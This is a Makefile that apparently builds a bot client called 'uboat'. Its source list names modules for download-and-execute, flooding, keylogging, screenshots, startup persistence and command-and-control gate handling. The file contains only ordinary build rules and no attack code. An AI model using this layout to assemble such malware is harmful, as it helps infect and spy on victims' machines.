CC	= g++

CFLAGS	+= -std=c++11 \
	-Iinclude \
	-pedantic \
	-Wall \
	-Werror \
	-Wextra \
	-g -O0 \
	-D_FORTIFY_SOURCE=2
	# -fdeclspec

LDFLAGS	+= -lpthread

NAME	= uboat
SRCS	:= Command.cpp \
	DownloadExecute.cpp \
	Flood.cpp \
	GateHelper.cpp \
	Keylogger.cpp \
	OSCpuChecker.cpp \
	OSGetRam.cpp \
	OSGpuChecker.cpp \
	OSHwidChecker.cpp \
	OSNetVersionChecker.cpp \
	OSVersionChecker.cpp \
	PEIsAdmin.cpp \
	Processes.cpp \
	Screenshot.cpp \
	Startup.cpp \
	URLEncoding.cpp \
	WebSafeEncryption.cpp \
	WebsiteChecker.cpp \
	xor.cpp \
	HttpQuery.cpp \
	main.cpp \
	SocketInit.cpp \
	Sockets.cpp \
	StringOperations.cpp \
	WindowsCompat.cpp
OBJS	:= $(SRCS:%.cpp=obj/%.o)

all: dirs $(NAME)

dirs:
	mkdir -p obj

$(NAME): $(OBJS)
	@$(CC) $(OBJS) $(LDFLAGS) -o $@ -fprofile-arcs -ftest-coverage
	@echo "Linking complete!"

$(OBJS): obj/%.o : boat/%.cpp
	@$(CC) $(USER_DEFINES) $(CFLAGS) -c $< -o $@
	@echo "Compiled "$<" successfully!"

clean:
	rm -f $(OBJS)

fclean: clean
	rm -f $(NAME)

re: fclean all

.PHONY: install
install: $(NAME)
	mkdir -p $(DESTDIR)$(PREFIX)/$(BINDIR)
	cp $(NAME) $(DESTDIR)$(PREFIX)/$(BINDIR)/$(NAME)

.PHONY: uninstall
uninstall:
	rm -f $(DESTDIR)$(PREFIX)/$(BINDIR)/$(NAME)
